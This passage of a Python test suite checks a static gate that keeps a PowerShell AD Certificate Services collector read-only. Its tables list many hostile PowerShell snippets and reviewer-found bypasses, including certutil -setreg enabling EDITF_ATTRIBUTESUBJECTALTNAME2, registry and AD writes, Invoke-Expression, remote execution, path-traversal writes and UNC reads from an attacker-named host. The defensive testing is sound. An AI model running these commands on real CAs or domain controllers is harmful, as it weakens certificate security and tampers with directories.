    assert _secret_closure(dump) == set(SECRET_VARIABLES)
    assert {_skey(_SCRIPT, n) for n in SECRET_SEEDS} <= set(SECRET_VARIABLES)
    uses = _secret_uses(dump, set(SECRET_VARIABLES))
    assert {k: sorted(v) for k, v in uses.items()} == {k: sorted(v) for k, v in SECRET_USES.items()}


def test_header_is_pinned() -> None:
    assert _dump(COLLECTOR)["header_sha256"] == HEADER_SHA256


# Spellings of the variable-writing common parameters: full names, unique
# prefixes and aliases. Each, on an allowlisted cmdlet, must be flagged; where
# the cmdlet is available to this pwsh, cmdlet metadata must resolve it to the
# canonical parameter (the metadata path, not only the gate's prefix rule).
_VARIABLE_PARAM_SPELLINGS = {
    "-OutVariable": "OutVariable",
    "-OutVar": "OutVariable",
    "-ov": "OutVariable",
    "-PipelineVariable": "PipelineVariable",
    "-Pi": "PipelineVariable",
    "-pv": "PipelineVariable",
    "-ErrorVariable": "ErrorVariable",
    "-ErrorV": "ErrorVariable",
    "-ev": "ErrorVariable",
    "-WarningVariable": "WarningVariable",
    "-wv": "WarningVariable",
    "-InformationVariable": "InformationVariable",
    "-iv": "InformationVariable",
}


@pytest.mark.parametrize("spelling", sorted(_VARIABLE_PARAM_SPELLINGS))
def test_variable_writing_parameter_spellings_are_flagged(tmp_path: Path, spelling: str) -> None:
    dump = _check_text(tmp_path, _appended(f"Get-Date {spelling} probeVar | Out-Null"))
    assert "[common-parameter]" in _tags(violations(dump)), spelling
    cmd = next(c for c in dump["commands"] if c["text"].startswith(f"Get-Date {spelling}"))
    assert (
        cmd["bound_params"] is not None
        and _VARIABLE_PARAM_SPELLINGS[spelling] in cmd["bound_params"]
    )


def test_forbidden_commands_are_never_allowlisted() -> None:
    forbidden = {c.lower() for c in FORBIDDEN_COMMANDS}
    assert not {c for c in ALLOWED_COMMANDS if c.lower() in forbidden}


# Files PowerShell can load as code or configuration. Every one under scripts/
# is either the gated collector or an analysis-host script declared out of scope.
_POWERSHELL_SUFFIXES = (".ps1", ".psm1", ".psd1", ".ps1xml", ".cdxml", ".pssc", ".psrc")
OUT_OF_SCOPE = {
    "install-windows.ps1": "runs on the analysis host to create a local venv, never on a CA",
    "uninstall-windows.ps1": "runs on the analysis host to remove the local venv, never on a CA",
}


def test_every_powershell_file_under_scripts_is_classified() -> None:
    scripts = ROOT / "scripts"
    on_disk = {
        p.relative_to(scripts).as_posix()
        for p in scripts.rglob("*")
        if p.is_file() and p.suffix.lower() in _POWERSHELL_SUFFIXES
    }
    assert on_disk == {COLLECTOR.name, *OUT_OF_SCOPE}


_BAD_SNIPPETS = {
    "set-adobject": "Set-ADObject -Identity 'x' -Replace @{a=1}",
    "new-aduser": "New-ADUser -Name x",
    "remove-adobject": "Remove-ADObject -Identity x",
    "certutil-setreg": "certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2",
    "commit-changes": (
        "$de = New-Object DirectoryServices.DirectoryEntry('LDAP://x'); $de.CommitChanges()"
    ),
    "properties-add": "$de.Properties['x'].Add('y')",
    "invoke-command": "Invoke-Command -ComputerName ca01 -ScriptBlock { 1 }",
    "invoke-expression": "Invoke-Expression 'whoami'",
    "dynamic-call": "$c = 'Set-Item'; & $c x",
    "dynamic-member": "$m = 'CommitChanges'; $de.$m()",
    "wmi-set": "$reg.SetDWORDValue(2147483650, 'k', 'v', 1)",
    "registry-writable": "[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('x', $true)",
    "set-itemproperty": "Set-ItemProperty -Path HKLM:\\x -Name y -Value 1",
    "file-write-elsewhere": "[IO.File]::WriteAllText('C:\\Windows\\x.txt', 'y')",
    "new-item-elsewhere": "New-Item -ItemType Directory -Path C:\\Windows\\x",
    "start-process": "Start-Process cmd.exe",
    "new-object-com": "New-Object -ComObject WScript.Shell",
    # --- review round 1: Sol's six reproduced bypasses -----------------------
    "sol-remote-wmi-foreach-member": (
        "$reg = Get-WmiObject -List -Namespace 'root\\default' -Class StdRegProv "
        "-ComputerName 'dc01'\n"
        "$reg | ForEach-Object -MemberName SetDWORDValue -ArgumentList "
        "@(2147483650, 'SOFTWARE\\AdcsLensProbe', 'Pwned', 1)"
    ),
    "sol-ad-foreach-member": (
        "$de = New-Object DirectoryServices.DirectoryEntry('LDAP://CN=x,DC=example,DC=test')\n"
        "$de | ForEach-Object -MemberName Put -ArgumentList @('description', 'owned')\n"
        "$de | ForEach-Object -MemberName SetInfo"
    ),
    "sol-registry-foreach-member": (
        "$rk = [Microsoft.Win32.Registry]::LocalMachine | ForEach-Object -MemberName "
        "CreateSubKey -ArgumentList 'SOFTWARE\\AdcsLensProbe'\n"
        "$rk | ForEach-Object -MemberName SetValue -ArgumentList @('Pwned', 1)"
    ),
    "sol-mutated-file-target": (
        "$p = 'C:\\Windows\\Temp\\adcs-lens-probe.txt'\n[IO.File]::WriteAllText($p, 'owned')"
    ),
    "sol-mutated-directory-target": (
        "$dir = 'C:\\Windows\\Temp\\adcs-lens-probe-dir'\nNew-Item -ItemType Directory -Path $dir"
    ),
    "sol-redirection": "$payload = 'owned'\n$payload > 'C:\\Windows\\Temp\\adcs-lens-probe.txt'",
    # --- review round 1: DeepSeek B1 (redirections) ----------------------------
    "ds-redirect-out-file": "Write-Output 'x' > C:\\Windows\\evil.txt",
    "ds-redirect-append-file": "Write-Output 'x' >> C:\\Windows\\evil.txt",
    "ds-redirect-noclobber": "Write-Output 'x' >| C:\\Windows\\evil.txt",
    "ds-redirect-in-var": "$s = 'x' > C:\\Windows\\evil.txt",
    "ds-redirect-stderr": "certutil -getreg x 2> C:\\Windows\\evil.txt",
    "ds-redirect-to-unc": "Write-Output 'x' > \\\\remote\\share\\evil.txt",
    "ds-redirect-only-in-pipeline": "1..3 | ForEach-Object { $_ } > C:\\evil.txt",
    "ds-redirect-merge": "Write-Output 'x' 2>&1",
    # --- DeepSeek B2: a second assignment repoints a write target ---------------
    "ds-second-assignment-outpath": (
        "$outPath = 'C:\\Windows\\Temp\\evil.json'\n[IO.File]::WriteAllText($outPath, 'x')"
    ),
    "ds-second-assignment-certdir": "$certDir = 'C:\\Windows\\Temp'",
    "ds-script-scope-assignment": "$script:outParent = 'C:\\Windows\\Temp'",
    "ds-compound-assignment": "$certFile += '\\..\\..\\evil'",
    "ds-foreach-rebinds-target": "foreach ($crlFile in @('..\\..\\evil')) { }",
    "ds-ref-rebinds-target": "$r = [ref]$outPath",
    "ds-set-variable": "Set-Variable -Name outPath -Value 'C:\\evil'",
    "ds-outvariable": "_decode 1 $NAME_FLAGS -OutVariable outPath",
    "ds-writejson-escape": "_writeJson @{} '..\\..\\evil.json'",
    # --- DeepSeek B3: New-Item -Name escapes the output directory ---------------
    "ds-new-item-name-escape": (
        "New-Item -ItemType Directory -Force -Path $OutDir -Name ..\\..\\Windows\\evil"
    ),
    # --- DeepSeek N1: certutil with a trailing -setreg ---------------------------
    "ds-certutil-getreg-then-setreg": (
        "certutil -getreg policy\\EditFlags -setreg policy\\EditFlags +X"
    ),
    "certutil-extra-key": "certutil -getreg $regpath CA\\Other",
}

# Replacement mutations of the real collector (the pin must be the AST, not text).
_REPLACEMENTS = {
    # DeepSeek B2: keep the old pin text as a comment, repoint the real assignment.
    "ds-pin-as-comment-then-repoint": (
        "  $outPath = Join-Path $OutDir $outName",
        "  # $outPath = Join-Path $OutDir $outName\n  $outPath = 'C:\\Windows\\Temp\\evil.json'",
    ),
    "repoint-certdir": (
        "$certDir = Join-Path $OutDir 'certs'",
        "$certDir = Join-Path 'C:\\Windows' 'certs'",
    ),
    "assign-outdir": (
        "New-Item -ItemType Directory -Force -Path $OutDir | Out-Null",
        "$OutDir = 'C:\\Windows'\nNew-Item -ItemType Directory -Force -Path $OutDir | Out-Null",
    ),
}


def _appended(snippet: str) -> str:
    return _collector_text() + "\n" + snippet + "\n"


def _replaced(name: str) -> str:
    old, new = _REPLACEMENTS[name]
    text = _collector_text()
    assert old in text, old
    return text.replace(old, new, 1)


def _check_text(tmp_path: Path, text: str) -> dict[str, Any]:
    script = tmp_path / "collector-variant.ps1"
    script.write_text(text, encoding="utf-8")
    return _dump(script)


@pytest.mark.parametrize("snippet", list(_BAD_SNIPPETS.values()), ids=list(_BAD_SNIPPETS))
def test_checker_flags_write_capable_surface(tmp_path: Path, snippet: str) -> None:
    """Each write-capable form, appended to the REAL collector, is reported.

    Appending (rather than checking the snippet alone) is what makes these
    meaningful: the snippet reuses the collector's own allowlisted names and
    variables, which is exactly how the round-1 bypasses worked.
    """
    assert violations(_check_text(tmp_path, _appended(snippet))), f"not flagged: {snippet}"


@pytest.mark.parametrize("name", sorted(_REPLACEMENTS))
def test_checker_flags_repointed_write_targets(tmp_path: Path, name: str) -> None:
    assert violations(_check_text(tmp_path, _replaced(name))), f"not flagged: {name}"


def test_appending_a_harmless_line_is_only_a_new_command(tmp_path: Path) -> None:
    """Control: the append harness itself causes no violation beyond the
    every-command pin (a harmless allowlisted command is still a new operation)."""
    found = violations(_check_text(tmp_path, _appended("Write-Output 'done'")))
    assert {v.split("]", 1)[0] + "]" for v in found} == {"[guarded-op]", "[statement-digest]"}


# --- review round 2 (Sol): each candidate, and WHICH check must flag it -------------
# Appended to the real collector. Every one also changes the golden syntax tree;
# the tag proves the semantic layer catches it too, for the right reason.
_SOL_R2: dict[str, tuple[str, str]] = {
    "directory_set_adobject": (
        "Set-ADObject -Identity 'CN=x,DC=example,DC=test' -Replace @{description='owned'}",
        "[command]",
    ),
    "directory_adsi_put": (
        "$de = [ADSI]'LDAP://CN=x,DC=example,DC=test'\n$de.Put('description', 'owned')\n$de.SetInfo()",
        "[member]",
    ),
    "ca_certutil_setreg": (
        "certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2",
        "[command]",
    ),
    "registry_set_item_property": (
        "Set-ItemProperty -Path HKLM:\\SOFTWARE -Name Probe -Value 1",
        "[command]",
    ),
    "remote_invoke_command": (
        "Invoke-Command -ComputerName dc01 -ScriptBlock { Set-ItemProperty -Path HKLM:\\SOFTWARE "
        "-Name Probe -Value 1 }",
        "[command]",
    ),
    "outside_direct_file": (
        "[IO.File]::WriteAllText('C:\\Windows\\Temp\\probe.txt', 'owned')",
        "[write-path]",
    ),
    "outside_indirect_file": (
        "$target = 'C:\\Windows\\Temp\\probe.txt'\n[IO.File]::WriteAllText($target, 'owned')",
        "[write-path]",
    ),
    "splatting": (
        "$args = @('-setreg', 'policy\\EditFlags', '+EDITF_ATTRIBUTESUBJECTALTNAME2')\ncertutil @args",
        "[command]",
    ),
    "pipeline_member_dispatch": (
        "$reg | ForEach-Object -MemberName SetDWORDValue -ArgumentList "
        "@(2147483650, 'SOFTWARE\\Probe', 'Pwned', 1)",
        "[command]",
    ),
    "dynamic_member": ("$method = 'SetInfo'\n$de.$method()", "[dynamic]"),
    "type_accelerator_adsi": ("$de = [ADSI]'LDAP://CN=x,DC=example,DC=test'", "[type]"),
    "type_alias_system_io_file": (
        "[System.IO.File]::WriteAllText('C:\\Windows\\Temp\\probe.txt', 'owned')",
        "[member]",
    ),
    "provider_path_direct": (
        "New-Item -ItemType Directory -Force -Path HKLM:\\SOFTWARE\\AdcsLensProbe",
        "[write-path]",
    ),
    "redirect_file": (
        "certutil -getreg CA\\CommonName 2> 'C:\\Windows\\Temp\\err.txt'",
        "[redirection]",
    ),
    "scope_modifier": (
        "$global:outPath = 'C:\\Windows\\Temp\\probe.txt'\n[IO.File]::WriteAllText($outPath, 'owned')",
        "[pinned-binding]",
    ),
    "function_unsafe_body": (
        "function Invoke-Later { Set-ItemProperty -Path HKLM:\\SOFTWARE -Name Probe -Value 1 }\n"
        "Invoke-Later",
        "[command]",
    ),
    "scriptblock_invoke_later": (
        "$later = { Set-ItemProperty -Path HKLM:\\SOFTWARE -Name Probe -Value 1 }\n$later.Invoke()",
        "[command]",
    ),
    "computer_different_variable": (
        "$otherDc = 'dc02.example.test'\n"
        "Get-WmiObject -ComputerName $otherDc -Namespace 'root\\default' -Class StdRegProv -List",
        "[command]",
    ),
    # The round-2 bypasses: case-insensitive names and same-name parameters.
    "BYPASS_case_insensitive_outpath": (
        "$OUTPATH = 'C:\\Windows\\Temp\\probe.txt'\n"
        "[IO.File]::WriteAllText($outPath, 'owned', (New-Object Text.UTF8Encoding($false)))",
        "[pinned-binding]",
    ),
    "BYPASS_function_parameter_outpath": (
        "function Invoke-Outside([string]$outPath) {\n"
        "  [IO.File]::WriteAllText($outPath, 'owned', (New-Object Text.UTF8Encoding($false)))\n"
        "}\nInvoke-Outside 'C:\\Windows\\Temp\\probe.txt'",
        "[pinned-binding]",
    ),
    "BYPASS_function_parameter_provider": (
        "function New-Outside([string]$OutDir) {\n"
        "  New-Item -ItemType Directory -Force -Path $OutDir | Out-Null\n"
        "}\nNew-Outside 'HKLM:\\SOFTWARE\\AdcsLensProbe'",
        "[pinned-binding]",
    ),
    "BYPASS_function_scriptblock_provider": (
        "function New-Later([string]$OutDir) {\n"
        "  1 | ForEach-Object { New-Item -ItemType Directory -Force -Path $OutDir | Out-Null }\n"
        "}\nNew-Later 'C:\\Windows\\Temp\\AdcsLensProbe'",
        "[pinned-binding]",
    ),
    "BYPASS_scriptblock_param_block": (
        "1 | ForEach-Object { param($outDir) New-Item -ItemType Directory -Force -Path $outDir }",
        "[pinned-binding]",
    ),
    "BYPASS_computer_same_name_parameter": (
        "function Read-OtherHost([string]$dcDns) {\n"
        "  Get-WmiObject -ComputerName $dcDns -Namespace 'root\\default' -Class StdRegProv -List\n"
        "}\nRead-OtherHost 'attacker.example.test'",
        "[pinned-binding]",
    ),
    "BYPASS_computer_same_name_reassignment": (
        "$dcDns = 'attacker.example.test'\n"
        "Get-WmiObject -ComputerName $dcDns -Namespace 'root\\default' -Class StdRegProv -List",
        "[pinned-binding]",
    ),
    "common_parameter_variable_write": (
        "Get-Date -OutVariable outPath | Out-Null",
        "[common-parameter]",
    ),
    "common_parameter_abbreviated": ("Get-Date -ov dcDns | Out-Null", "[common-parameter]"),
    "unbound_receiver": (
        "$ExecutionContext.SessionState.PSVariable.Set('outPath', 'C:\\evil')",
        "[receiver]",
    ),
}


@pytest.mark.parametrize("name", sorted(_SOL_R2))
def test_round2_candidate_is_flagged_by_the_right_check(tmp_path: Path, name: str) -> None:
    snippet, tag = _SOL_R2[name]
    dump = _check_text(tmp_path, _appended(snippet))
    found = violations(dump)
    assert any(v.startswith(tag) for v in found), (name, tag, found)
    assert tree_changed(dump)


def test_null_discard_is_allowed_by_semantics_but_not_by_the_inventory(tmp_path: Path) -> None:
    """Sol's control: `$NULL = ...` cannot rebind $null, so the semantic layer
    admits it, and the golden syntax tree still flags the change."""
    dump = _check_text(tmp_path, _appended("$NULL = 'C:\\Windows\\Temp\\err.txt'"))
    # $null = ... binds nothing and is not a write/exec; the only violation is the
    # structural-closure digest of the new statement.
    assert {v.split("]", 1)[0] + "]" for v in violations(dump)} == {"[statement-digest]"}
    assert tree_changed(dump)


def test_an_extra_certutil_call_is_a_new_exec_operation(tmp_path: Path) -> None:
    """The second half of Sol's control. Under collector 0.10.0 certutil runs
    only through _certutilRead (`-getreg $regpath 2>&1`): a direct call is a new
    operation outside GUARDED_OPS, its literal key is not the pinned vector, and
    a file-style `2>$null` redirection is no longer allowed."""
    dump = _check_text(tmp_path, _appended("certutil -getreg CA\\CommonName 2>$null"))
    tags = {v.split("]", 1)[0] + "]" for v in violations(dump)}
    assert tags == {"[guarded-op]", "[command]", "[redirection]", "[ast]", "[statement-digest]"}
    assert tree_changed(dump)


# --- property / indexer assignments (review round 2, DS N-R2-3) ------------------


def test_member_assignment_allowlist_matches_the_collector_exactly() -> None:
    """Every allowlisted object write is one the collector really makes, and vice versa."""
    dump = _dump(COLLECTOR)
    seen_members = {
        (m["receiver_root"], m["target"].lower().split(".", 1)[-1])
        for m in dump["member_assignments"]
        if m["kind"] == "member"
    }
    allowed_members = set(MEMBER_ASSIGNMENTS_ALLOWED) | set(NESTED_MEMBER_ASSIGNMENTS_ALLOWED)
    seen_index = {m["receiver_root"] for m in dump["member_assignments"] if m["kind"] == "index"}
    assert seen_members == allowed_members
    assert seen_index == set(INDEX_ASSIGNMENTS_ALLOWED)
    assert _member_assignment_violations(dump) == []


def test_collector_has_no_destructuring_or_unrecognised_targets() -> None:
    kinds = {b["kind"] for b in _dump(COLLECTOR)["bindings"]}
    assert not {k for k in kinds if k.startswith("destructure")}
    assert "assign-unrecognised-target" not in kinds


# --- round-3 classes (gpo-lens reviewers), adapted to this collector -----------------
# (id, edits, expected check). Each edit is (anchor, replacement) applied in
# order to the real collector; the anchor must occur exactly once. An anchor of
# "" means "append". Every probe was accepted by the a789b5d gate (semantic
# layer and/or golden inventory unchanged) — see CHANGELOG — and must now be
# flagged by its expected check, not by a parse error, AND change the tree.
_SELFTEST_GUARD = "if ($PSCmdlet.ParameterSetName -eq 'SelfTest') { return }\n"
_OUTDIR_MKDIR = "New-Item -ItemType Directory -Force -Path $OutDir | Out-Null\n"
_CERTFILE = "$certFile = '{0:d2}-{1}.cer'"
Edit = tuple[str, str]
_R3_PROBES: list[tuple[str, tuple[Edit, ...], str]] = [
    (
        "guard_moved_after_write",
        ((_SELFTEST_GUARD, ""), (_OUTDIR_MKDIR, _OUTDIR_MKDIR + _SELFTEST_GUARD)),
        "[guarded-op]",
    ),
    (
        "guard_weakened_opt_in",
        (("if ($CollectDcMapping) {", "if ($CollectDcMapping -or $true) {"),),
        "[guarded-op]",
    ),
    (
        "guard_or_to_and",
        (
            (
                "$dcDns.ToLower() -eq $localHost -or $dcDns",
                "$dcDns.ToLower() -eq $localHost -and $dcDns",
            ),
        ),
        "[guarded-op]",
    ),
    ("requires_module", (("<prepend>", "#Requires -Modules AdcsLensProbe\n"),), "[ast]"),
    (
        "psdefaultparametervalues",
        (("", "$PSDefaultParameterValues['Get-WmiObject:ComputerName'] = 'host.example.test'"),),
        "[binding]",
    ),
    (
        "receiver_rebind",
        (
            (
                "    if ($key) { $key.GetValue('Security') } else { $null }\n",
                "    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\AdcsLensProbe')\n"
                "    if ($key) { $key.GetValue('Security') } else { $null }\n",
            ),
        ),
        "[pinned-binding]",
    ),
    (
        "alias_provider_write",
        (("# --- manifest ---", "${Alias:Get-Date} = 'Get-Random'\n# --- manifest ---"),),
        "[binding]",
    ),
    ("duplicate_write_op", (("", "_writeJson @($caConfig) 'ca-config.json'"),), "[guarded-op]"),
    (
        "computed_outvariable",
        (("", "Get-Date -OutVariable ('out' + 'Path') | Out-Null"),),
        "[common-parameter]",
    ),
    (
        "later_member_argument",
        (("(New-Object Text.UTF8Encoding($false))", "(New-Object Text.UTF8Encoding($true))"),),
        "[guarded-op]",
    ),
    (
        "unpinned_counter_reassigned",
        ((_CERTFILE, "$i = 'probe'\n      " + _CERTFILE),),
        "[pinned-binding]",
    ),
    ("counter_decrement_added", ((_CERTFILE, "$i--\n      " + _CERTFILE),), "[pinned-binding]"),
    ("provider_drive_write", (("", "${C:\\Windows\\Temp\\probe.txt} = 'x'"),), "[binding]"),
    ("env_variable_write", (("", "$env:PSModulePath = 'x'"),), "[binding]"),
    ("global_variable_write", (("", "$global:AdcsLensProbe = 1"),), "[binding]"),
    ("preference_variable_write", (("", "$ErrorActionPreference = 'Continue'"),), "[binding]"),
    (
        "parameter_default_added",
        (
            (
                "[Parameter(Mandatory, ParameterSetName = 'Collect')] [string] $OutDir,",
                "[Parameter(ParameterSetName = 'Collect')] [string] $OutDir = 'probe',",
            ),
        ),
        "[pinned-binding]",
    ),
    (
        "helper_redefined",
        (
            (
                "# --- self-test boundary",
                "function _safeFileName([string]$name) { $name }\n# --- self-test boundary",
            ),
        ),
        "[local-function]",
    ),
    (
        "callsite_argument_added",
        (("", "_certutilFlags 'policy\\Other' | Out-Null"),),
        "[pinned-binding]",
    ),
    ("dot_sourced_helper_call", (("", ". _writeJson @{} 'probe.json'"),), "[dynamic]"),
    (
        "splat_into_helper",
        (("", "$probeArgs = @(1, 2)\n_decode @probeArgs | Out-Null"),),
        "[binding]",
    ),
    ("extra_positional_argument", (("", "_decode 1 $NAME_FLAGS 'extra' | Out-Null"),), "[binding]"),
    # --- Round-4 classes (gpo-lens Sol), adapted to this collector ---
    # BL-1: a helper's return value is changed to feed a write path; its body is
    # not reachable through the call-site binding, so only the body pin catches it.
    (
        "helper_return_rebinds_write_path",
        (("  ($name -replace '[^A-Za-z0-9._-]', '_')", "  '..\\..\\..\\Windows\\evil'"),),
        "[statement-digest]",
    ),
    # BL-2: a helper feeding an exec/remote input (the WMI credential) returns a
    # constant; every binding and call vector is unchanged.
    (
        "helper_constant_return",
        (
            (
                "function _b64([string]$s) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }",
                "function _b64([string]$s) { 'ATTACKER' }",
            ),
        ),
        "[statement-digest]",
    ),
    # --- Integration r2 (Sol B1) ---
    # Wrapping the whole script body in a named block changes no statement's
    # own subtree, only its ancestor (NamedBlockAst.BlockKind / Unnamed).
    *(
        (
            f"root_body_wrapped_in_{kind}",
            (
                (
                    "\n$ErrorActionPreference = 'Stop'\n",
                    f"\n{kind} {{\n$ErrorActionPreference = 'Stop'\n",
                ),
                ("", "}"),
            ),
            "[statement-digest]",
        )
        for kind in ("begin", "process", "end", "clean")
    ),
    # Every write sink must be preceded by Assert-AdcsOutputPath on its exact target.
    (
        "write_guard_removed",
        (("        Assert-AdcsOutputPath (Join-Path $certDir $certFile)\n", ""),),
        "[write-guard]",
    ),
    (
        "write_guard_wrong_target",
        (("  Assert-AdcsOutputPath $outPath\n", "  Assert-AdcsOutputPath $outParent\n"),),
        "[write-guard]",
    ),
    (
        "write_guard_only_on_one_branch",
        (
            (
                "\nAssert-AdcsOutputPath $OutDir\n",
                "\nif ($CollectDcMapping) { Assert-AdcsOutputPath $OutDir }\n",
            ),
        ),
        "[write-guard]",
    ),
    (
        "write_guard_body_neutered",
        (
            (
                '  if (-not $inside) { throw "refusing to write outside the output directory: $full" }\n',
                "",
            ),
        ),
        "[statement-digest]",
    ),
    # BL-3: a duplicate state-changing instance call (an extra LDAP FindOne, like
    # an early Dispose/Close on a handle) before the real one; a set of method
    # names and receivers would miss it, the guarded-op multiset does not.
    (
        "duplicate_lifetime_call",
        (("  $conn.Bind()\n", "  $conn.Bind()\n  $conn.Bind()\n"),),
        "[guarded-op]",
    ),
    # --- Round-3 classes (Sol B1 / DeepSeek B-R3-1), adapted to this collector ---
    # Sol B1: ForEach-Object / Where-Object / % process blocks run in the
    # caller's scope, so an unqualified assignment inside one rebinds the real
    # pinned variable. Each targets a different confined root.
    (
        "caller_scope_foreach_outroot",
        (("", "1 | ForEach-Object { $OutDir = 'C:\\Windows\\Temp\\AdcsProbe' }"),),
        "[pinned-binding]",
    ),
    (
        "caller_scope_where_certdir",
        (("", "1 | Where-Object { $certDir = 'C:\\Windows\\Temp\\AdcsProbe'; $true } | Out-Null"),),
        "[pinned-binding]",
    ),
    (
        "caller_scope_foreach_dcdns",
        (("", "1 | ForEach-Object { $dcDns = 'attacker.example.test' }"),),
        "[pinned-binding]",
    ),
    (
        "caller_scope_psscriptroot_root",
        (("", "1 | ForEach-Object { $OutDir = $PSScriptRoot }"),),
        "[pinned-binding]",
    ),
    (
        "caller_scope_transitive_dcuser",
        (("", "1 | ForEach-Object { $DcRegistryUser = 'attacker\\admin' }"),),
        "[pinned-binding]",
    ),
    # DeepSeek B-R3-1: a case-variant spelling of a local function is the same
    # function to PowerShell; it must hit the same pins and checks.
    (
        "case_variant_writejson_escape",
        (("", "_WRITEJSON @{} '..\\..\\evil.json'"),),
        "[write-path]",
    ),
    (
        "case_variant_writejson_remote",
        (("", "_writeJSON @{} '\\\\remote\\share\\evil.json'"),),
        "[write-path]",
    ),
    # --- Round-4 classes (Sol B1): constructor overloads and .NET call overloads ---
    # An allowlisted type reached through another constructor overload (a PFX
    # path + persist-key flags): only the exact (,$der) vector is admitted.
    (
        "x509_persist_key_constructor",
        (
            (
                "",
                "New-Object Security.Cryptography.X509Certificates.X509Certificate2("
                "'C:\\Windows\\Temp\\attacker.pfx', 'password', 18) | Out-Null",
            ),
        ),
        "[command]",
    ),
    # The same constructor through [Type]::new(...).
    (
        "type_new_constructor",
        (
            (
                "",
                "[Security.Cryptography.X509Certificates.X509Certificate2]::new("
                "'C:\\Windows\\Temp\\attacker.pfx', 'password', 18) | Out-Null",
            ),
        ),
        "[member]",
    ),
    # An extra call of an allowlisted method on an allowlisted receiver.
    (
        "member_call_added",
        (
            (
                "  $p['distinguishedname'] = @([string]$entry.DistinguishedName)\n",
                "  $null = $p.ContainsKey('cn')\n"
                "  $p['distinguishedname'] = @([string]$entry.DistinguishedName)\n",
            ),
        ),
        "[member-call]",
    ),
    # --- Integration (collector 0.10.0) + gpo-lens rounds 5-7 classes ---
    # An LDAP write request type is never admitted (SearchRequest only).
    (
        "ldap_modify_request",
        (
            (
                "",
                "$mr = [System.DirectoryServices.Protocols.ModifyRequest]::new("
                "'CN=x,DC=example,DC=test', 'Replace', 'description', 'y')",
            ),
        ),
        "[type]",
    ),
    # A credential used at a new site (logged; written into the export).
    ("secret_logged", (("", "Write-Host $LdapPass"),), "[secret]"),
    ("secret_written", (("", "_writeJson @{ p = $DcRegistryPass } 'probe.json'"),), "[secret]"),
    # UNC / URL forms in a command argument and in a binding value.
    (
        "unc_command_argument",
        (
            (
                "",
                "Get-WmiObject -ComputerName '\\\\host.example.test' -Namespace "
                "'root\\default' -Class StdRegProv -List | Out-Null",
            ),
        ),
        "[unc-url]",
    ),
    ("url_binding_value", (("", "$probeUrl = 'https://host.example.test/x'"),), "[unc-url]"),
    # Every command invocation is pinned, even a harmless allowlisted one.
    ("allowlisted_command_added", (("", "Get-Date | Out-Null"),), "[guarded-op]"),
    # A new dynamic invocation outside the pinned three.
    ("dynamic_invocation_added", (("", "$read = { 1 }\n& $read"),), "[dynamic]"),
    # A changed message is a changed (pinned) command.
    (
        "message_text_changed",
        (
            (
                'Write-Host "Using integrated auth (current user) for LDAP"',
                'Write-Host "Using integrated auth for LDAP"',
            ),
        ),
        "[guarded-op]",
    ),
    # --- Integration r1 (Sol B1): switch -File / remote literals anywhere ---
    # A switch -File reading a UNC path: rejected by the statement-flag screen
    # AND as a remote string literal.
    (
        "switch_file_unc",
        (("", "switch -File '\\\\attacker.example.test\\share\\probe.txt' { default { } }"),),
        "[ast]",
    ),
    # switch -File with a variable path (still a -File switch).
    (
        "switch_file_variable",
        (("", "$probePath = 'C:\\probe.txt'\nswitch -File $probePath { default { } }"),),
        "[ast]",
    ),
    # switch -Regex is also a non-None flag.
    ("switch_regex_flag", (("", "switch -Regex ('a') { 'a' { 1 } }"),), "[ast]"),
    # A provider-drive variable path read ${\\host\share\x} is a remote literal
    # in a binding target and a provider-drive reference.
    (
        "provider_unc_variable",
        (("", "${\\\\host\\share\\x} = 'y'"),),
        "[unc-url]",
    ),
    # A remote literal in a here-string / deep expression, not a command element.
    (
        "remote_literal_in_expression",
        (("", "$probe = @{ path = '\\\\attacker.example.test\\share' }"),),
        "[unc-url]",
    ),
    # A device-path literal (\\?\ / \\.\).
    # A bare appended statement with no write/exec/binding effect: caught only by
    # the structural-closure digest (every statement is pinned).
    ("trailing_return", (("", "return"),), "[statement-digest]"),
    ("device_path_literal", (("", "$probe = '\\\\?\\C:\\probe.txt'"),), "[unc-url]"),
]


def test_header_help_edit_is_caught_by_the_header_pin(tmp_path: Path) -> None:
    """The script header (help, [CmdletBinding], param block) is digest-pinned: a
    help-text edit leaves the AST unchanged but fails [header] (and the golden
    source digest)."""
    text = _collector_text().replace(
        "  Directory to write the export into (created if absent).",
        "  Directory to write the export into.",
    )
    assert text != _collector_text()
    dump = _check_text(tmp_path, text)
    assert _tags(violations(dump)) == {"[header]"}
    assert not tree_changed(dump)
    assert render_inventory(dump) != INVENTORY.read_text(encoding="utf-8")


def _apply(edits: tuple[Edit, ...]) -> str:
    text = _collector_text()
    for anchor, change in edits:
        if anchor == "":
            text = text + "\n" + change + "\n"
        elif anchor == "<prepend>":
            text = change + text
        else:
            assert text.count(anchor) == 1, f"edit anchor must occur exactly once: {anchor!r}"
            text = text.replace(anchor, change, 1)
    return text


def _tags(found: list[str]) -> set[str]:
    return {v.split("]", 1)[0] + "]" for v in found}


@pytest.mark.parametrize("probe", _R3_PROBES, ids=[p[0] for p in _R3_PROBES])
def test_round3_class_is_flagged_by_the_right_check(
    tmp_path: Path, probe: tuple[str, tuple[Edit, ...], str]
) -> None:
    probe_id, edits, expected = probe
    dump = _check_text(tmp_path, _apply(edits))
    tags = _tags(violations(dump))
    assert "[parse]" not in tags, (probe_id, tags)
    assert expected in tags, (probe_id, expected, tags)
    assert tree_changed(dump), probe_id


def test_line_ending_normalization_matches_git() -> None:
    """The golden's only normalization is CRLF->LF. That is exactly git's own
    normalization for `*.ps1 text eol=crlf`: the repository stores LF and every
    checkout writes CRLF, so a CRLF<->LF change inside a here-string cannot be
    committed at all, and a bare CR (which neither normalizes) changes the
    source digest. Pin the attribute so the two cannot drift apart."""
    if shutil.which("git") is None or not (ROOT / ".git").exists():
        pytest.skip("not a git checkout")
    out = subprocess.run(
        ["git", "-C", str(ROOT), "check-attr", "text", "eol", "--", str(COLLECTOR)],
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    assert ": text: set" in out and ": eol: crlf" in out, out


def test_every_write_sink_is_guarded_on_its_exact_target() -> None:
    """The product guard precedes all seven write sinks (four New-Item, three
    WriteAll*), each on the sink's own target, and nothing else writes."""
    dump = _dump(COLLECTOR)
    sinks = _write_sinks(dump)
    assert sorted(target or "" for _, _, target, _ in sinks) == sorted(
        [
            "$OutDir",
            "$outParent",
